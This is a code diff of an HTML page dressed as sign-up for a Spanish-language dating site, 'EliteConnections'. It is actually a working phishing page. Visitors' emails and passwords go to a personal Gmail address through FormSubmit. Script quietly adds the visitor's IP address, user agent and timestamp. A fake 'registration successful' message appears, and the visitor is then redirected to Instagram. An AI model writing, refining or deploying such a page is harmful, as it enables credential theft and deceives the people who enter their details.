@@ -3,49 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro - EliteConnections</title>
+    <title>EliteConnections - Encuentra Tu Amor</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            overflow: hidden;
-            height: 100vh;
-        }
-
-        #videoBackground {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: -2;
-        }
-
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255, 105, 180, 0.85) 0%, rgba(147, 112, 219, 0.85) 50%, rgba(65, 105, 225, 0.85) 100%);
-            z-index: -1;
+            background: linear-gradient(135deg, #ff6b9d, #c779d0, #4bc0c8);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
 
         .container {
-            max-width: 480px;
-            margin: 40px auto;
-            padding: 40px 35px;
             background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
             border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 450px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.3);
         }
@@ -56,12 +38,26 @@
         }
 
         .logo h1 {
-            font-size: 2.5em;
-            font-weight: 700;
-            background: linear-gradient(135deg, #ff69b4, #9370db, #4169e1);
+            font-size: 2.8em;
+            font-weight: bold;
+            background: linear-gradient(135deg, #ff6b9d, #c779d0);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            margin-bottom: 10px;
+        }
+
+        .logo p {
+            color: #666;
+            font-size: 1.1em;
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 1.4em;
+            font-weight: 600;
         }
 
         .form-group {
@@ -70,9 +66,10 @@
 
         label {
             display: block;
-            margin-bottom: 10px;
-            font-weight: 600;
+            margin-bottom: 8px;
             color: #555;
+            font-weight: 600;
+            font-size: 0.95em;
         }
 
         input[type="email"],
@@ -82,100 +79,261 @@
             border: 2px solid #e1e8ed;
             border-radius: 12px;
             font-size: 16px;
+            transition: all 0.3s ease;
             background: #fff;
         }
 
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #ff6b9d;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 107, 157, 0.1);
+        }
+
         button {
-            background: linear-gradient(135deg, #ff69b4, #9370db);
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff6b9d, #c779d0);
             color: white;
             border: none;
-            padding: 16px;
             border-radius: 12px;
-            cursor: pointer;
             font-size: 16px;
-            width: 100%;
             font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 107, 157, 0.3);
         }
 
         button:disabled {
-            background: #cccccc;
+            background: #ccc;
+            transform: none;
+            box-shadow: none;
             cursor: not-allowed;
+        }
+
+        .loading {
+            text-align: center;
+            margin-top: 15px;
+            color: #ff6b9d;
+            font-weight: 600;
+            display: none;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .feature {
+            text-align: center;
+            padding: 15px;
+            background: rgba(255, 107, 157, 0.1);
+            border-radius: 10px;
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .feature i {
+            font-size: 1.5em;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .login-link {
+            text-align: center;
+            margin-top: 25px;
+            color: #666;
+            font-size: 0.95em;
+        }
+
+        .login-link a {
+            color: #ff6b9d;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .login-link a:hover {
+            text-decoration: underline;
+        }
+
+        .error {
+            color: #e74c3c;
+            font-size: 0.85em;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <video id="videoBackground" autoplay muted loop>
-        <source src="https://assets.mixkit.co/videos/preview/mixkit-couple-having-a-romantic-dinner-while-looking-at-43363-large.mp4" type="video/mp4">
-    </video>
-    <div class="overlay"></div>
-
     <div class="container">
         <div class="logo">
             <h1>EliteConnections</h1>
-            <div>Donde los corazones se encuentran</div>
+            <p>Donde los corazones se encuentran</p>
         </div>
         
         <h2>Comienza tu historia de amor</h2>
         
-        <!-- FORMULARIO FORMSUBMIT CON CONFIGURACIÓN CORRECTA -->
-        <form action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
+        <!-- FORMULARIO FORMSUBMIT -->
+        <form id="registroForm" action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
             <!-- CONFIGURACIÓN FORMSUBMIT -->
             <input type="hidden" name="_subject" value="🔥 NUEVO REGISTRO - EliteConnections">
-            <input type="hidden" name="_template" value="basic">
-            <input type="text" name="_honey" style="display:none">
+            <input type="hidden" name="_template" value="table">
             <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_autoresponse" value="¡Gracias por registrarte en EliteConnections! Tu cuenta está siendo verificada.">
+            <input type="text" name="_honey" style="display:none">
+            
+            <!-- REDIRECCIÓN DESPUÉS DEL ENVÍO -->
             <input type="hidden" name="_next" value="https://www.instagram.com">
             
             <div class="form-group">
-                <label>Correo electrónico</label>
-                <input type="email" name="email" required placeholder="tu.corazon@ejemplo.com">
+                <label for="email">Correo electrónico</label>
+                <input type="email" id="email" name="email" required placeholder="tu.amor@ejemplo.com">
+                <div class="error" id="emailError">Por favor ingresa un email válido</div>
             </div>
             
             <div class="form-group">
-                <label>Contraseña</label>
-                <input type="password" name="password" required minlength="8" placeholder="Mínimo 8 caracteres">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" required minlength="8" placeholder="Mínimo 8 caracteres">
+                <div class="error" id="passwordError">La contraseña debe tener al menos 8 caracteres</div>
             </div>
             
-            <!-- CAMPOS ADICIONALES QUE QUIERES RECIBIR -->
-            <input type="hidden" name="fecha" id="fechaField">
-            <input type="hidden" name="ip" id="ipField">
+            <!-- CAMPOS ADICIONALES QUE SE LLENAN AUTOMÁTICAMENTE -->
+            <input type="hidden" name="fecha_registro" id="fechaField">
+            <input type="hidden" name="ip_usuario" id="ipField">
             <input type="hidden" name="navegador" id="navegadorField">
+            <input type="hidden" name="pagina" value="EliteConnections">
+            <input type="hidden" name="tipo" value="registro_dating">
             
-            <button type="submit" id="submitButton">Encontrar mi pareja ideal</button>
+            <button type="submit" id="submitButton">
+                <span id="buttonText">Encontrar mi pareja ideal</span>
+            </button>
+            
+            <div class="loading" id="loadingMessage">
+                🔍 Buscando tu media naranja...
+            </div>
         </form>
+
+        <div class="success-message" id="successMessage">
+            ✅ ¡Registro exitoso! Revisa tu correo electrónico.
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <i>❤️</i>
+                Compatibilidad 99%
+            </div>
+            <div class="feature">
+                <i>🔒</i>
+                Cuenta Verificada
+            </div>
+            <div class="feature">
+                <i>🌎</i>
+                Miembros Globales
+            </div>
+            <div class="feature">
+                <i>💬</i>
+                Chat Premium
+            </div>
+        </div>
+
+        <div class="login-link">
+            ¿Ya tienes una cuenta? <a href="#">Inicia sesión aquí</a>
+        </div>
     </div>
 
-<script>
-// Llenar campos ocultos antes de enviar
-document.querySelector('form').addEventListener('submit', function() {
-    // Fecha actual
-    document.getElementById('fechaField').value = new Date().toLocaleString('es-ES');
-    
-    // Navegador
-    document.getElementById('navegadorField').value = navigator.userAgent;
-    
-    // Obtener IP
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            document.getElementById('ipField').value = data.ip;
-        })
-        .catch(() => {
-            document.getElementById('ipField').value = 'IP no disponible';
+    <script>
+        // CONFIGURACIÓN INICIAL
+        document.addEventListener('DOMContentLoaded', function() {
+            // Llenar campos automáticamente
+            document.getElementById('fechaField').value = new Date().toLocaleString('es-ES');
+            document.getElementById('navegadorField').value = navigator.userAgent;
+            
+            // Obtener IP del usuario
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ipField').value = data.ip;
+                })
+                .catch(() => {
+                    document.getElementById('ipField').value = 'IP no disponible';
+                });
         });
-    
-    // Deshabilitar botón
-    document.getElementById('submitButton').disabled = true;
-    document.getElementById('submitButton').textContent = 'Enviando...';
-});
 
-// Si falla FormSubmit, mostrar mensaje
-setTimeout(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('success')) {
-        alert('¡Registro exitoso! Revisa tu correo.');
-    }
-}, 1000);
-</script>
+        // VALIDACIÓN DEL FORMULARIO
+        document.getElementById('registroForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitButton = document.getElementById('submitButton');
+            const buttonText = document.getElementById('buttonText');
+            const loadingMessage = document.getElementById('loadingMessage');
+            
+            let isValid = true;
+            
+            // Validar email
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('emailError').style.display = 'none';
+            }
+            
+            // Validar contraseña
+            if (password.length < 8) {
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('passwordError').style.display = 'none';
+            }
+            
+            if (!isValid) {
+                e.preventDefault();
+                return;
+            }
+            
+            // Si la validación pasa, mostrar estado de carga
+            submitButton.disabled = true;
+            buttonText.textContent = 'Procesando...';
+            loadingMessage.style.display = 'block';
+            
+            // El formulario se enviará automáticamente a FormSubmit
+            // FormSubmit se encarga de enviar el email a enriquepng1@gmail.com
+            
+            // Mostrar mensaje de éxito después de 2 segundos (simulación)
+            setTimeout(() => {
+                document.getElementById('successMessage').style.display = 'block';
+            }, 2000);
+        });
+
+        // Validación en tiempo real
+        document.getElementById('email').addEventListener('input', function() {
+            if (this.value.length > 0) {
+                document.getElementById('emailError').style.display = 'none';
+            }
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            if (this.value.length >= 8) {
+                document.getElementById('passwordError').style.display = 'none';
+            }
+        });
+    </script>
 </body>
-                </html>
+    </html>
